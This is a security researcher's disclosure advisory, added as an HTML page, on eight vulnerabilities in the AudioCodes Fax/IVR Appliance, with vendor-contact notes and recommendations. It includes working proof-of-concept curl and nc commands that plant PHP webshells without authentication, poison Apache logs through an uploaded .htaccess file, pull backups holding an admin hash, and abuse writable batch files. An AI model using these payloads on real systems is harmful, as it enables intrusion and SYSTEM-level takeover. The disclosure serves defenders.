@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>8 vulnerabilities in AudioCodes Fax/IVR Appliance - IT Security Research by Pierre</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link href="css/bootstrap.min.css" rel="stylesheet">
+<link href="feed.xml" rel="alternate" type="application/rss+xml" title="Blog" />
+<style>
+body {
+    font-family: sans-serif;
+    background-color: #fff;
+    font-size: 16px;
+}
+h1, h2, h3, h4 {
+    font-family: arial;
+}
+.container {
+    max-width: 900px;
+}
+.footer {
+    margin-top: 50px;
+    font-size: 12px;
+    text-align: center;
+}
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="hero-unit faq">
+        <div class="ac" style="text-align: center;">
+            <h1>IT Security Research by Pierre</h1>
+            <a href="../index.html">Home</a> &bull; <a href="about.html">About</a>  &bull; <a href="feed.xml">Feed</a>
+        </div>
+    </div>
+    
+<div class="hero-unit faq">
+    <div class="ac">
+        <h2>8 vulnerabilities in AudioCodes Fax/IVR Appliance</h2>
+    </div>
+</div>
+
+<div>
+    <h2>Product description</h2>
+<blockquote>
+<p>AudioCodes' Fax Server (Fax to Mail and Mail to Fax) application is a powerful and flexible software
+application used to manage inbound fax calls and outbound mail-to-fax calls, delivering them
+efficiently to their correct destination.</p>
+<p>From <a href="https://www.audiocodes.com/media/14442/fax-server-and-auto-attendant-ivr-administrators-guide-ver-26x.pdf">https://www.audiocodes.com/media/14442/fax-server-and-auto-attendant-ivr-administrators-guide-ver-26x.pdf</a></p>
+</blockquote>
+<h2>Vulnerabilities Summary</h2>
+<p>Vulnerable versions: all versions.</p>
+<p>The summary of the vulnerabilities is:</p>
+<ol>
+<li><a href="#rce-01">CVE-2025-34328 - Pre-authenticated Remote Code Execution #1</a><br></li>
+<li><a href="#rce-02">CVE-2025-34329 - Pre-authenticated Remote Code Execution #2</a><br></li>
+<li><a href="#file-upload">CVE-2025-34330 - Pre-authenticated File upload vulnerability</a><br></li>
+<li><a href="#file-read">CVE-2025-34331 - Pre-authenticated File read</a><br></li>
+<li><a href="#lpe-01">CVE-2025-34332 - Local Privilege Escalation #1</a><br></li>
+<li><a href="#lpe-02">CVE-2025-34333 - Local Privilege Escalation #2</a><br></li>
+<li><a href="#rce-03">CVE-2025-34334 - Post-authenticated Command Injection and Local Privilege Escalation</a><br></li>
+<li><a href="#rce-04">CVE-2025-34335 - Post-authenticated Command Injection</a><br></li>
+</ol>
+<p><em>Miscellaneous notes</em>:</p>
+<p>The critical vulnerabilities have been confirmed to be present in the latest public version.</p>
+<p>Other vulnerabilities I have also identified require authentication, therefore the security risk is considered low to medium:</p>
+<ul>
+<li>An attacker with admin privileges in the web interface can execute commands as <code>NT AUTHORITY\SYSTEM</code> in several ways;</li>
+<li>An attacker with a local account on the server will very quickly gain <code>NT AUTHORITY\SYSTEM</code> privileges, as file and directory permissions are insecure everywhere.</li>
+</ul>
+<p>Vulnerabilities #1, #2 #3 and #4 were shared with Audiocodes PSIRT but communication was almost nonexistent (see <a href="#timeline">Report Timeline</a>): AudioCodes PSIRT never provided any information or feedback, even with my regular follow-up emails. I also believe that this solution is EOL since December 31, 2024.</p>
+<p>Vulnerabilities #5, #7 and #8 were discovered during an audit of an "unsupported" version of the AudioCodes Fax/IVR Appliance that was incorrectly patched. New unsupported versions were found in the vendor AWS S3 bucket that allows directory listing (<a href="https://downloads-audiocodes.s3.eu-central-1.amazonaws.com/">https://downloads-audiocodes.s3.eu-central-1.amazonaws.com/</a>) - this bucket is used by the vendor to distribute some of its solutions. Surprisingly, the root causes were not addressed and the vulnerabilities #1 through #4 were still present. Vulnerability #6 was simply discovered during the creation of this security advisory to illustrate insecure permissions.</p>
+<p>I didn't spend much time analyzing this solution (installation took 10 minutes and the first pre-auth RCE was found in about 5 minutes), but the existing PHP code presents a considerable attack surface.</p>
+<p>Regarding the security status of this product, it is also quite surprising to find no public CVEs. I assume this solution has never been audited.</p>
+<p>Unfortunately, the vendor has not followed their official security vulnerability handling. AudioCode's PSIRT team has not responded, and security advisories have not been published.</p>
+<p>Additionally, It is also worth noting that Audiocodes Session Border Controllers (SBCs) were quietly patched in 2024 to address the misfortune cookie vulnerability (CVE-2014-9222). This exploit was tested on the Median Virtual Edition and Mediant 800 SBCs.</p>
+<pre><code>kali% curl -kv --header 'Cookie: C1012213=1' https:///192.168.0.2/
+-&gt; /acBin/TPApp will segfault in the remote appliance/ARM device
+</code></pre>
+<ul>
+<li>firmware sbc-F7.40A.005.619 is vulnerable.</li>
+<li>firmware sbc-F7.40A.500.781 is not vulnerable.</li>
+</ul>
+<p>No security bulletins were found regarding this silently patched vulnerability and it is recommended to use the latest firmware version of Audiocodes Session Border Controllers.</p>
+<p><em>Impacts</em></p>
+<p>An attacker can compromise AudioCodes Fax/IVR Appliance without authentication and move laterally in the telecom and IT infrastructure.</p>
+<p>An attacker can compromise outdated AudioCodes Session Border Controllers with the misfortune cookie vulnerability.</p>
+<p><em>Recommendations</em></p>
+<p>Do not use AudioCodes Fax/IVR Appliance.</p>
+<p>Do not expose the AudioCodes Fax/IVR Appliance to the network.</p>
+<p>Use secure permissions.</p>
+<p>Remove vulnerable webpages.</p>
+<p>Update Audiocodes Session Border Controllers.</p>
+<h2>Identification of the solution</h2>
+<p>The latest solution (AudioCodes Fax/IVR Appliance Installer, Version 2.6.230.000) can be found at:</p>
+<ul>
+<li><a href="https://downloads-audiocodes.s3.eu-central-1.amazonaws.com/Download/AC_FAX_IVR_IW.html">https://downloads-audiocodes.s3.eu-central-1.amazonaws.com/Download/AC_FAX_IVR_IW.html</a></li>
+<li><a href="https://downloads-audiocodes.s3.eu-central-1.amazonaws.com/Fax_IVR/FaxAtt_Setup_2.6.230.000.zip">https://downloads-audiocodes.s3.eu-central-1.amazonaws.com/Fax_IVR/FaxAtt_Setup_2.6.230.000.zip</a></li>
+</ul>
+<p><img alt="" src="images/2025-audiocodes-ivr.png" /></p>
+<p><a id="rce-01"></a></p>
+<h2>Details - Pre-authenticated Remote Code Execution #1</h2>
+<p>The vulnerability is located in the <code>C:\F2MAdmin\F2E\AudioCodes_files\utils\IVR\diagram\ajaxScript.php</code> PHP file. This file allows an attacker to upload files without authentication.</p>
+<p>Content of <code>C:\F2MAdmin\F2E\AudioCodes_files\utils\IVR\diagram\ajaxScript.php</code>:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
+  <span style="color: #666666">2</span> <span style="color: #19177C">$dir</span>  <span style="color: #666666">=</span> <span style="color: #008000">dirname</span>(<span style="color: #008000">dirname</span>(<span style="color: #880000">__FILE__</span>));
+  <span style="color: #666666">3</span> <span style="color: #008000; font-weight: bold">require_once</span> <span style="color: #19177C">$dir</span><span style="color: #666666">.</span><span style="color: #BA2121">&#39;/classes/SystemStatus.class.php&#39;</span>;
+  <span style="color: #666666">4</span> 
+  <span style="color: #666666">5</span> <span style="color: #408080; font-style: italic">//$scriptName = $_REQUEST[&#39;scriptName&#39;];</span>
+  <span style="color: #666666">6</span> <span style="color: #19177C">$action</span> <span style="color: #666666">=</span> <span style="color: #008000">isset</span>(<span style="color: #19177C">$_REQUEST</span>[<span style="color: #BA2121">&quot;action&quot;</span>]) <span style="color: #666666">?</span> <span style="color: #19177C">$_REQUEST</span>[<span style="color: #BA2121">&quot;action&quot;</span>] <span style="color: #666666">:</span> <span style="color: #BA2121">&quot;&quot;</span>;
+  <span style="color: #666666">7</span> 
+  <span style="color: #666666">8</span> <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #666666">!</span><span style="color: #008000; font-weight: bold">empty</span>(<span style="color: #19177C">$action</span>)){
+  <span style="color: #666666">9</span>         <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #19177C">$action</span> <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;getScripts&#39;</span>){
+[<span style="color: #666666">...</span>]
+ <span style="color: #666666">26</span>         }
+ <span style="color: #666666">27</span>         <span style="color: #008000; font-weight: bold">else</span> <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #19177C">$action</span> <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;saveScript&#39;</span>){
+ <span style="color: #666666">28</span>                 <span style="color: #19177C">$scriptValue</span> <span style="color: #666666">=</span> <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;value&#39;</span>]; <span style="color: #408080; font-style: italic">// [1] - attacker-controlled value</span>
+ <span style="color: #666666">29</span>                 <span style="color: #19177C">$scriptName</span> <span style="color: #666666">=</span> <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&#39;name&#39;</span>];   <span style="color: #408080; font-style: italic">// [2] - attacker-controlled value</span>
+ <span style="color: #666666">30</span> 
+ <span style="color: #666666">31</span>                 <span style="color: #19177C">$systemStatus</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> SystemStatus();
+ <span style="color: #666666">32</span>                 <span style="color: #19177C">$sysInfo</span> <span style="color: #666666">=</span> <span style="color: #19177C">$systemStatus</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">GetSysInfo</span>();
+ <span style="color: #666666">33</span>                 <span style="color: #19177C">$path</span> <span style="color: #666666">=</span> <span style="color: #19177C">$sysInfo</span>[SystemStatus<span style="color: #666666">::</span><span style="color: #7D9029">SCRIPTS_DIR</span>];
+ <span style="color: #666666">34</span> 
+ <span style="color: #666666">35</span>                 <span style="color: #19177C">$ok</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;false&#39;</span>;
+ <span style="color: #666666">36</span>                 <span style="color: #19177C">$ok</span> <span style="color: #666666">=</span> <span style="color: #008000">file_put_contents</span>(<span style="color: #19177C">$path</span><span style="color: #666666">.</span><span style="color: #BA2121">&quot;/&quot;</span><span style="color: #666666">.</span><span style="color: #19177C">$scriptName</span>, <span style="color: #19177C">$scriptValue</span>); <span style="color: #408080; font-style: italic">// [3] - insecure file write with attacker-controlled values</span>
+ <span style="color: #666666">37</span>                 <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #19177C">$ok</span> <span style="color: #666666">===</span> <span style="color: #008000; font-weight: bold">true</span>){
+ <span style="color: #666666">38</span>                         <span style="color: #19177C">$ok</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;true&#39;</span>;
+ <span style="color: #666666">39</span>                 }
+ <span style="color: #666666">40</span>                 <span style="color: #008000">ob_clean</span>();
+ <span style="color: #666666">41</span>                 <span style="color: #008000; font-weight: bold">echo</span> (<span style="color: #19177C">$ok</span>);
+ <span style="color: #666666">42</span>                 <span style="color: #008000; font-weight: bold">die</span>;
+ <span style="color: #666666">43</span>         }
+ <span style="color: #666666">44</span> }
+</pre></div>
+
+<p>As shown in the source code, there is no authentication.</p>
+<p>Without authentication, a remote attacker can access line 36 to write any file under <code>NT AUTHORITY\system</code> (Apache runs as <code>NT AUTHORITY\system</code>) because all the arguments for the <code>file_put_contents()</code> function are under attacker's control.</p>
+<p>A PoC is provided below. A webshell is uploaded and a command is executed:</p>
+<pre><code>kali% curl -kv "http://10.105.0.239:8090/AudioCodes_files/utils/IVR/diagram/ajaxScript.php?action=saveScript" -d "name=F2MAdmin/F2E/webshell4.php&amp;value=&lt;?php system(\$_GET['c']);?&gt;"
+*   Trying 10.105.0.239:8090...
+* Connected to 10.105.0.239 (10.105.0.239) port 8090
+* using HTTP/1.x
+&gt; POST /AudioCodes_files/utils/IVR/diagram/ajaxScript.php?action=saveScript HTTP/1.1
+&gt; Host: 10.105.0.239:8090
+&gt; User-Agent: curl/8.13.0
+&gt; Accept: */*
+&gt; Content-Length: 65
+&gt; Content-Type: application/x-www-form-urlencoded
+&gt; 
+* upload completely sent off: 65 bytes
+&lt; HTTP/1.1 200 OK
+&lt; Date: Mon, 26 May 2025 14:44:38 GMT
+&lt; Server: Apache/2.4.62 (Win32) OpenSSL/3.1.7 PHP/8.1.31
+&lt; X-Powered-By: PHP/8.1.31
+&lt; Set-Cookie: PHPSESSID=301ccae912e0c2aee878361e74d5bb30; path=/
+&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
+&lt; Cache-Control: no-store, no-cache, must-revalidate
+&lt; Pragma: no-cache
+&lt; Content-Length: 2
+&lt; Content-Type: text/html; charset=UTF-8
+&lt; 
+* Connection #0 to host 10.105.0.239 left intact
+%
+kali% curl "http://10.105.0.239:8090/webshell4.php?c=whoami"
+nt authority\system
+kali%
+</code></pre>
+<p>The resulting commands will be executed as <code>NT AUTHORITY\system</code> (meaning full control of the remote server without authentication).</p>
+<p>If the <code>SystemStatus::SCRIPTS_DIR</code> variable (used for the <code>$path</code> variable in line 33) is set to a specific directory, the attacker can simply specify <code>name=/../../../../../../../F2MAdmin/F2E/webshell4.php</code> as a path traversal in the HTTP request to traverse the directory and write the webshell in the <code>C:\F2MAdmin\F2E\</code> directory (corresponding to the <code>DocumentRoot</code> directory).</p>
+<p><a id="rce-02"></a></p>
+<h2>Details - Pre-authenticated Remote Code Execution #2</h2>
+<p>The <code>C:\F2MAdmin\F2E\AudioCodes_files\ajaxBackupUploadFile.php</code> PHP script does not implement authentication, allowing any remote attacker to upload any file and overwrite any backup file in the default backup folder (default is <code>C:\</code>).</p>
+<p>Content of <code>C:\F2MAdmin\F2E\AudioCodes_files\ajaxBackupUploadFile.php</code>:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
+  <span style="color: #666666">2</span> <span style="color: #008000; font-weight: bold">require_once</span> <span style="color: #BA2121">&#39;utils/IVR/classes/IvrBackup.class.php&#39;</span>;
+  <span style="color: #666666">3</span> <span style="color: #008000; font-weight: bold">require_once</span> <span style="color: #BA2121">&#39;utils/IVR/IvrRestUtil.php&#39;</span>;
+  <span style="color: #666666">4</span> <span style="color: #008000; font-weight: bold">require_once</span> <span style="color: #BA2121">&#39;utils/IVR/diagram/constants.php&#39;</span>;
+  <span style="color: #666666">5</span> 
+  <span style="color: #666666">6</span> <span style="color: #19177C">$ivrBackup_ins</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> IvrBackups();
+  <span style="color: #666666">7</span> <span style="color: #19177C">$target_path</span> <span style="color: #666666">=</span> <span style="color: #19177C">$ivrBackup_ins</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">GetBackupFolderPath</span>()<span style="color: #666666">.</span><span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\\</span><span style="color: #BA2121">&quot;</span>;
+  <span style="color: #666666">8</span> 
+  <span style="color: #666666">9</span> 
+ <span style="color: #666666">10</span> <span style="color: #408080; font-style: italic">//$target_path = &quot;C:\\F2MAdmin\\tmp\\&quot;;</span>
+ <span style="color: #666666">11</span> 
+ <span style="color: #666666">12</span> <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #666666">!</span><span style="color: #008000">is_dir</span>(<span style="color: #19177C">$target_path</span>))
+ <span style="color: #666666">13</span>         <span style="color: #008000">mkdir</span>(<span style="color: #19177C">$target_path</span>, <span style="color: #666666">0777</span>, <span style="color: #008000; font-weight: bold">true</span>);
+ <span style="color: #666666">14</span> <span style="color: #408080; font-style: italic">/* Add the original filename to our target path.  </span>
+<span style="color: #408080; font-style: italic"> 15 Result is &quot;uploads/filename.extension&quot; */</span>
+ <span style="color: #666666">16</span> <span style="color: #19177C">$target_path</span> <span style="color: #666666">=</span> <span style="color: #19177C">$target_path</span> <span style="color: #666666">.</span> <span style="color: #008000">basename</span>( <span style="color: #19177C">$_FILES</span>[<span style="color: #BA2121">&#39;fileToUpload&#39;</span>][<span style="color: #BA2121">&#39;name&#39;</span>]);
+ <span style="color: #666666">17</span> <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #008000">move_uploaded_file</span>(<span style="color: #19177C">$_FILES</span>[<span style="color: #BA2121">&#39;fileToUpload&#39;</span>][<span style="color: #BA2121">&#39;tmp_name&#39;</span>], <span style="color: #19177C">$target_path</span>)) {
+ <span style="color: #666666">18</span>     <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;The file &quot;</span><span style="color: #666666">.</span>  <span style="color: #008000">basename</span>( <span style="color: #19177C">$_FILES</span>[<span style="color: #BA2121">&#39;fileToUpload&#39;</span>][<span style="color: #BA2121">&#39;name&#39;</span>])<span style="color: #666666">.</span>
+ <span style="color: #666666">19</span>     <span style="color: #BA2121">&quot; has been uploaded.&quot;</span>;
+ <span style="color: #666666">20</span> } <span style="color: #008000; font-weight: bold">else</span>{
+ <span style="color: #666666">21</span>     <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;There was an error uploading the file, please try again!&quot;</span>;
+ <span style="color: #666666">22</span> }
+ <span style="color: #666666">23</span> <span style="color: #008000; font-weight: bold">die</span>;
+</pre></div>
+
+<p>Exploitation is explained below:</p>
+<p>1. With <code>/AudioCodes_files/ajaxBackupUploadFile.php</code>, upload of a <code>.htaccess</code> file in <code>C:\</code> containing this line:</p>
+<p><code>php_value auto_prepend_file C:/Apache24/logs/access.log</code></p>
+<p>You can also skip step 2 and directly include a base64-encoded PHP webshell inside the <code>.htaccess</code> file with <code>auto_prepend_file = "data:;base64,BASE64(webshell)"</code> but it will probably be detected and blocked by any EDR.</p>
+<p>2. Apache logs will be used to store a PHP webshell by requesting <code>/OUTPUT:&lt;?php system($_GET['c']);?&gt;</code> (this is an invalid HTTP request as we do not want to URL-encode the space into <code>%20</code>). The <code>OUTPUT</code> keyword  is used to filter the interesting part of the resulting webpages in step 3 since the answer will also contain some HTML tags and JavaScript code.</p>
+<p>3. Getting Remote Code Execution by reaching any PHP page because the <code>C:\Apache24\logs\access.log</code> file will now be appended and it contains a PHP webshell.</p>
+<p>PoC:</p>
+<pre><code>kali% curl -F "fileToUpload=php_value auto_prepend_file C:/Apache24/logs/access.log;filename=.htaccess" http://10.105.0.239:8090/AudioCodes_files/ajaxBackupUploadFile.php
+The file .htaccess has been uploaded.
+
+kali% echo "OUTPUT:&lt;?php system(\$_GET['c']);?&gt;" | nc -v 10.105.0.239 8090
+10.105.0.239: inverse host lookup failed: Unknown host
+(UNKNOWN) [10.105.0.239] 8090 (?) open
+HTTP/1.1 400 Bad Request
+Date: 26 May 2025 14:54:31 GMT
+Server: Apache/2.4.62 (Win32) OpenSSL/3.1.7 PHP/8.1.31
+Content-Length: 226
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;400 Bad Request&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Bad Request&lt;/h1&gt;
+&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;
+&lt;/p&gt;
+&lt;/body&gt;&lt;/html&gt;
+kali%
+
+kali% curl -s 'http://10.105.0.239:8090/?c=whoami' | grep OUTPUT
+10.105.0.238 - - [26/May/2025:14:54:34 -0700] "OUTPUT:nt authority\system
+kali% curl -s 'http://10.105.0.239:8090/?c=dir' | grep -A 10 OUTPUT
+10.105.0.238 - - [26/May/2025:14:54:39 -0700] "OUTPUT: Volume in drive C has no label.
+ Volume Serial Number is DECE-1ED7
+
+ Directory of C:\F2MAdmin\F2E
+
+05/26/2025  07:37 AM    &lt;DIR&gt;          .
+05/26/2025  07:37 AM    &lt;DIR&gt;          ..
+08/22/2023  12:37 PM            13,964 agent.php
+08/22/2023  12:37 PM               342 agentLogout.php
+08/22/2023  12:37 PM            27,611 AudioCodes.php
+05/26/2025  07:40 AM    &lt;DIR&gt;          AudioCodes_files
+kali%
+</code></pre>
+<p><a id="file-upload"></a></p>
+<h2>Details - Pre-authenticated File upload vulnerability</h2>
+<p>The <code>C:\F2MAdmin\F2E\AudioCodes_files\utils\IVR\diagram\ajaxPromptUploadFile.php</code> PHP script does not implement authentication, allowing any remote attacker to upload any file in <code>C:\F2MAdmin\tmp</code>.</p>
+<p>PoC:</p>
+<pre><code>kali% curl -F "fileToUpload=test;filename=test2.txt" http://10.105.0.239:8090/AudioCodes_files/utils/IVR/diagram/ajaxPromptUploadFile.php
+The file test2.txt has been uploaded
+kali%
+</code></pre>
+<p>The resulting file will be stored in <code>C:\F2mAdmin\tmp</code>.</p>
+<p><a id="file-read"></a></p>
+<h2>Details - Pre-authenticated File read</h2>
+<p>The <code>C:\F2MAdmin\F2E\AudioCodes_files\download.php</code> PHP script does not implement authentication.</p>
+<p>This script allows to download files stored in the appliance depending on the authorized extensions (e.g., zip, txt, c2v, ...).</p>
+<p>This vulnerability allows an attacker to download the backup files and compromise the server since they contain hashes of users.</p>
+<p>The format of the backup filename can be easily guessed (<code>BACKUP_Day_DD_Month_YY_HH_MM_SS.zip</code>).</p>
+<p>PoC:</p>
+<pre><code>kali% curl 'http://10.105.0.239:8090/AudioCodes_files/download.php?baseDir=C:\F2MAdmin\backup\&amp;f=BACKUP_Mon_26_May_25_20_23_42.zip' --output BACKUP_Mon_26_May_25_20_23_42.zip
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  3739  100  3739    0     0   139k      0 --:--:-- --:--:-- --:--:--  140k
+kali% 7z l BACKUP_Mon_26_May_25_20_23_42.zip
+
+7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
+ 64-bit locale=en_US.UTF-8 Threads:8 OPEN_MAX:1024, ASM
+
+Scanning the drive for archives:
+1 file, 3739 bytes (4 KiB)
+
+Listing archive: BACKUP_Mon_26_May_25_20_23_42.zip
+
+--
+Path = BACKUP_Mon_26_May_25_20_23_42.zip
+Type = zip
+Physical Size = 3739
+
+   Date      Time    Attr         Size   Compressed  Name
+------------------- ----- ------------ ------------  ------------------------
+2025-05-26 10:23:42 .....         5120          402  dbcdr.db
+2025-05-26 10:23:44 .....          455          154  ErrorLog.txt
+2025-05-26 10:23:42 .....        73728         2484  f2e.db3
+2025-05-26 10:23:44 .....          678          209  log.txt
+2025-05-26 10:23:44 .....            2            2  ovoc.json
+------------------- ----- ------------ ------------  ------------------------
+2025-05-26 10:23:44              79983         3251  5 files
+kali% unzip BACKUP_Mon_26_May_25_20_23_42.zip
+Archive:  BACKUP_Mon_26_May_25_20_23_42.zip
+  inflating: dbcdr.db                
+  inflating: ErrorLog.txt            
+  inflating: f2e.db3                 
+  inflating: log.txt                 
+ extracting: ovoc.json               
+kali% sqlite3 f2e.db3
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter ".help" for usage hints.
+sqlite&gt; .dump
+[...]
+INSERT INTO ADMIN VALUES(1,'Admin','e3afed0047b08059d0fada10f400c1e5',NULL,NULL,0,1);
+[...]
+</code></pre>
+<p><a id="lpe-01"></a></p>
+<h2>Details - Local Privilege Escalation #1</h2>
+<p>Some batch files are executed as <code>NT AUTHORITY\system</code> with the <code>system()</code> function. Unfortunately, these batch files can be overwritten by local users due to insecure permissions.</p>
+<p>Content of <code>C:\F2E\AudioCodes_files\ajaxPost.php</code>:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
+[<span style="color: #666666">...</span>]
+<span style="color: #666666">132</span>                         <span style="color: #19177C">$cmd</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;cmd /c &quot;</span><span style="color: #666666">.</span><span style="color: #BA2121">&quot;C:</span><span style="color: #BB6622; font-weight: bold">\\</span><span style="color: #BA2121">F2MAdmin</span><span style="color: #BB6622; font-weight: bold">\\</span><span style="color: #BA2121">F2E</span><span style="color: #BB6622; font-weight: bold">\\</span><span style="color: #BA2121">AudioCodes_files</span><span style="color: #BB6622; font-weight: bold">\\</span><span style="color: #BA2121">utils</span><span style="color: #BB6622; font-weight: bold">\\</span><span style="color: #BA2121">Services</span><span style="color: #BB6622; font-weight: bold">\\</span><span style="color: #BA2121">&quot;</span>;
+<span style="color: #666666">133</span>                         <span style="color: #19177C">$stop</span> <span style="color: #666666">=</span> <span style="color: #19177C">$cmd</span><span style="color: #666666">.</span><span style="color: #BA2121">&quot;stop.bat&quot;</span>;
+<span style="color: #666666">134</span>                         <span style="color: #19177C">$start</span> <span style="color: #666666">=</span> <span style="color: #19177C">$cmd</span><span style="color: #666666">.</span><span style="color: #BA2121">&quot;start.bat&quot;</span>;
+<span style="color: #666666">135</span>                         <span style="color: #19177C">$restart</span> <span style="color: #666666">=</span> <span style="color: #19177C">$cmd</span><span style="color: #666666">.</span><span style="color: #BA2121">&quot;restart.bat&quot;</span>;
+<span style="color: #666666">136</span>                         <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #19177C">$serviceName</span> <span style="color: #666666">==</span> Services<span style="color: #666666">::</span><span style="color: #7D9029">FAX_SERVER_NAME</span> <span style="color: #666666">||</span> <span style="color: #19177C">$serviceName</span> <span style="color: #666666">==</span> Services<span style="color: #666666">::</span><span style="color: #7D9029">FAX_ENGINE_NAME</span>){
+<span style="color: #666666">137</span>                                 <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #19177C">$action</span> <span style="color: #666666">!=</span> Actions<span style="color: #666666">::</span><span style="color: #7D9029">START</span> ){
+<span style="color: #666666">138</span>                                         <span style="color: #008000">system</span>(<span style="color: #19177C">$stop</span><span style="color: #666666">.</span><span style="color: #BA2121">&#39; &quot;&#39;</span><span style="color: #666666">.</span>Services<span style="color: #666666">::</span><span style="color: #7D9029">FAX_SERVER_NAME</span><span style="color: #666666">.</span><span style="color: #BA2121">&#39;&quot;&#39;</span>);
+<span style="color: #666666">139</span>                                         <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #19177C">$serviceName</span> <span style="color: #666666">==</span> Services<span style="color: #666666">::</span><span style="color: #7D9029">FAX_ENGINE_NAME</span>)
+<span style="color: #666666">140</span>                                                 <span style="color: #008000">system</span>(<span style="color: #19177C">$stop</span><span style="color: #666666">.</span><span style="color: #BA2121">&#39; &quot;&#39;</span><span style="color: #666666">.</span>Services<span style="color: #666666">::</span><span style="color: #7D9029">FAX_ENGINE_NAME</span><span style="color: #666666">.</span><span style="color: #BA2121">&#39;&quot;&#39;</span>);
+<span style="color: #666666">141</span>                                 }
+<span style="color: #666666">142</span>                                 <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #19177C">$action</span> <span style="color: #666666">!=</span> Actions<span style="color: #666666">::</span><span style="color: #7D9029">STOP</span>){
+<span style="color: #666666">143</span>                                         <span style="color: #008000">system</span>(<span style="color: #19177C">$start</span><span style="color: #666666">.</span><span style="color: #BA2121">&#39; &quot;&#39;</span><span style="color: #666666">.</span>Services<span style="color: #666666">::</span><span style="color: #7D9029">FAX_ENGINE_NAME</span><span style="color: #666666">.</span><span style="color: #BA2121">&#39;&quot;&#39;</span>); <span style="color: #408080; font-style: italic">// start always</span>
+<span style="color: #666666">144</span>                                         <span style="color: #008000">system</span>(<span style="color: #19177C">$start</span><span style="color: #666666">.</span><span style="color: #BA2121">&#39; &quot;&#39;</span><span style="color: #666666">.</span>Services<span style="color: #666666">::</span><span style="color: #7D9029">FAX_SERVER_NAME</span><span style="color: #666666">.</span><span style="color: #BA2121">&#39;&quot;&#39;</span>);
+</pre></div>
+
+<p>These files can be modified by any user on the server, allowing them to obtain <code>NT AUTHORITY\SYSTEM</code> privileges:</p>
+<p><img alt="" src="images/2025-audiocodes-ivr-permissions.png" /></p>
+<p>Using <code>icacls</code>:</p>
+<pre><code>C:\F2MAdmin\F2E\AudioCodes_files\utils\Services&gt; icacls *
+restart.bat BUILTIN\Administrators:(I)(F)
+            NT AUTHORITY\SYSTEM:(I)(F)
+            BUILTIN\Users:(I)(RX)
+            NT AUTHORITY\Authenticated Users:(I)(M)
+
+RestartBlade.bat BUILTIN\Administrators:(I)(F)
+                 NT AUTHORITY\SYSTEM:(I)(F)
+                 BUILTIN\Users:(I)(RX)
+                 NT AUTHORITY\Authenticated Users:(I)(M)
+
+RestartEmail.bat BUILTIN\Administrators:(I)(F)
+                 NT AUTHORITY\SYSTEM:(I)(F)
+                 BUILTIN\Users:(I)(RX)
+                 NT AUTHORITY\Authenticated Users:(I)(M)
+
+RestartFaxReceiver.bat BUILTIN\Administrators:(I)(F)
+                       NT AUTHORITY\SYSTEM:(I)(F)
+                       BUILTIN\Users:(I)(RX)
+                       NT AUTHORITY\Authenticated Users:(I)(M)
+
+RestartService.bat BUILTIN\Administrators:(I)(F)
+                   NT AUTHORITY\SYSTEM:(I)(F)
+                   BUILTIN\Users:(I)(RX)
+                   NT AUTHORITY\Authenticated Users:(I)(M)
+
+RestartWatchdog.bat BUILTIN\Administrators:(I)(F)
+                    NT AUTHORITY\SYSTEM:(I)(F)
+                    BUILTIN\Users:(I)(RX)
+                    NT AUTHORITY\Authenticated Users:(I)(M)
+
+Service.class.php BUILTIN\Administrators:(I)(F)
+                  NT AUTHORITY\SYSTEM:(I)(F)
+                  BUILTIN\Users:(I)(RX)
+                  NT AUTHORITY\Authenticated Users:(I)(M)
+
+ServicesKeys.class.php BUILTIN\Administrators:(I)(F)
+                       NT AUTHORITY\SYSTEM:(I)(F)
+                       BUILTIN\Users:(I)(RX)
+                       NT AUTHORITY\Authenticated Users:(I)(M)
+
+start.bat BUILTIN\Administrators:(I)(F)
+          NT AUTHORITY\SYSTEM:(I)(F)
+          BUILTIN\Users:(I)(RX)
+          NT AUTHORITY\Authenticated Users:(I)(M)
+
+startCommetrex.bat BUILTIN\Administrators:(I)(F)
+                   NT AUTHORITY\SYSTEM:(I)(F)
+                   BUILTIN\Users:(I)(RX)
+                   NT AUTHORITY\Authenticated Users:(I)(M)
+
